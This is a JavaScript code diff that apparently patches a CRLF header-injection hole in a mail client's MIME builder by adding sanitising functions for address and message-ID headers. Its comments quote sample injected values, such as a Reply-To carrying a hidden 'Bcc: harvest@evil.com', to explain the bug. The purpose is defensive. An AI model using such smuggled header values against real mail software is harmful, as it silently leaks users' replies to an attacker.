@@ -432,16 +432,46 @@ function b64urlEncode(text) {
  */
 export function buildMime(m) {
   const boundary = `bmm_${Math.random().toString(36).slice(2)}`;
+
+  /*
+   * EVERY HEADER VALUE IS SCRUBBED. THIS WAS A REAL, EXPLOITABLE BUG.
+   *
+   * `safeHeaderValue` and `safeFilename` existed and were applied to
+   * ATTACHMENT metadata only. To, Cc, Bcc, From, In-Reply-To and References
+   * were interpolated raw, so a CRLF in any of them injected an arbitrary
+   * header -- classically a hidden `Bcc:`.
+   *
+   * WHY THIS IS WORSE THAN "THE USER COULD TYPE IT INTO THEIR OWN MESSAGE".
+   *
+   * `To` is not only typed. `buildReply()` fills it from the INBOUND message's
+   * Reply-To or From header, which is entirely attacker-controlled. A crafted
+   * message with
+   *
+   *     Reply-To: prof@bits.ac.in\r\nBcc: harvest@evil.com
+   *
+   * meant that hitting Reply -- an action with no warning attached -- silently
+   * copied the reply to a third party. Verified end to end before fixing:
+   * buildReply produced the poisoned string and buildMime emitted the Bcc.
+   *
+   * Scrubbing happens HERE, at the last gate before the wire, rather than in
+   * buildReply. There are three producers of these fields (compose, reply,
+   * the outbox replaying a stored draft) and one consumer; fixing the consumer
+   * cannot be bypassed by a fourth producer added later.
+   *
+   * BARE LF COUNTS. Some MTAs and parsers accept a lone \n as a header
+   * separator, so stripping only \r\n is not enough -- `safeHeaderValue`
+   * already handles both, which is why it is reused rather than reinvented.
+   */
   const headers = [
-    m.from ? `From: ${m.from}` : null,
-    `To: ${m.to}`,
-    m.cc ? `Cc: ${m.cc}` : null,
-    m.bcc ? `Bcc: ${m.bcc}` : null,
+    m.from ? `From: ${safeAddressHeader(m.from)}` : null,
+    `To: ${safeAddressHeader(m.to)}`,
+    m.cc ? `Cc: ${safeAddressHeader(m.cc)}` : null,
+    m.bcc ? `Bcc: ${safeAddressHeader(m.bcc)}` : null,
     `Subject: ${encodeHeader(m.subject)}`,
     // Threading. Without these two a reply starts a NEW conversation, which is
     // the single most visible way a mail client looks broken.
-    m.inReplyTo ? `In-Reply-To: ${m.inReplyTo}` : null,
-    m.references ? `References: ${m.references}` : null,
+    m.inReplyTo ? `In-Reply-To: ${safeIdHeader(m.inReplyTo)}` : null,
+    m.references ? `References: ${safeIdHeader(m.references)}` : null,
     'MIME-Version: 1.0',
   ].filter(Boolean);
 
@@ -537,9 +567,87 @@ function safeFilename(name) {
 }
 
 /** Same rule for any value we interpolate into a header. */
-function safeHeaderValue(v) {
-  return String(v || '').replace(/[\r\n"]+/g, '').slice(0, 200);
+function safeHeaderValue(v, max = 200) {
+  /*
+   * Strips CR, LF and the quote character, then caps the length.
+   *
+   * The cap is a parameter because 200 is right for a filename or a MIME type
+   * and WRONG for a recipient list: a reply-all on a project thread runs well
+   * past 200 characters, and silently truncating it would drop recipients from
+   * a message the user believes they sent to everyone. Address headers pass a
+   * generous limit; the RFC 5322 line-length guidance is about folding, which
+   * Gmail's API does for us.
+   */
+  return String(v || '').replace(/[\r\n\u2028\u2029"]+/g, '').slice(0, max);
 }
+
+/**
+ * Address headers: the same scrubbing, with NO length cap.
+ *
+ * A generous cap was tried first (2000 characters) and was still wrong. A
+ * reply-all to a 60-person project thread is ~2500 characters, and the cap
+ * silently dropped twelve recipients -- caught by measuring it rather than by
+ * reasoning about it.
+ *
+ * Truncating an address list is DATA LOSS in the direction the user cannot
+ * see: the message sends, looks fine in Sent, and a third of the recipients
+ * never receive it. The cap was defending against nothing -- length is not the
+ * attack, CRLF is, and that is stripped regardless. Gmail's API rejects a
+ * genuinely absurd header itself, which is the right place for that limit.
+ */
+function safeAddressHeader(v) {
+  /*
+   * ADDRESS HEADERS ARE REBUILT FROM PARSED TOKENS, NOT PATCHED.
+   *
+   * Two weaker fixes were tried first and both were wrong, which is why this
+   * one is written the way it is.
+   *
+   *   DELETE the line break   -> "a@b.com\r\nBcc: x@evil.com" becomes
+   *                              "a@b.comBcc: x@evil.com": no header is
+   *                              injected, but the recipient is now one
+   *                              malformed token.
+   *
+   *   REPLACE it with a space -> "a@b.com Bcc: x@evil.com": still on the To
+   *                              line, and space-separated addresses ARE legal
+   *                              in some parsers, so the attacker's address
+   *                              may simply be delivered to.
+   *
+   * Neither is acceptable, because the goal is not "no extra header" -- it is
+   * THE ATTACKER'S ADDRESS MUST NOT REACH THE WIRE AT ALL.
+   *
+   * So the value is split on line breaks and on commas, and every resulting
+   * token is kept only if it looks like a real recipient: an optional display
+   * name followed by one address, or a bare address. `Bcc: x@evil.com` matches
+   * neither -- a header name with a colon is not an address -- so it is
+   * discarded rather than reshaped.
+   *
+   * Regular commas are preserved, so a legitimate reply-all is untouched, and
+   * there is no length cap: truncating a recipient list is silent data loss in
+   * the direction the user cannot see.
+   */
+  const ADDRESS = /^(?:[^<>,:;"]{0,120}<[^<>@\s]+@[^<>@\s]+>|[^<>,:;"\s]+@[^<>,:;"\s]+)$/;
+
+  return String(v || '')
+    .split(/[\r\n\u2028\u2029,]+/)
+    .map((tok) => tok.replace(/"/g, '').trim())
+    .filter((tok) => tok && ADDRESS.test(tok))
+    .join(', ');
+}
+
+/**
+ * Message-ID style headers (In-Reply-To, References).
+ *
+ * These are `<id@host>` tokens, space separated, so they need the same
+ * "rebuild from valid tokens" treatment but a different shape of token.
+ */
+function safeIdHeader(v) {
+  return String(v || '')
+    .split(/[\r\n\u2028\u2029\s]+/)
+    .map((t) => t.trim())
+    .filter((t) => /^<[^<>\s]+>$/.test(t))
+    .join(' ');
+}
+
 
 /** Minimal, escaped plain-text -> HTML. Never interpolates raw user text. */
 function plainToHtml(text) {
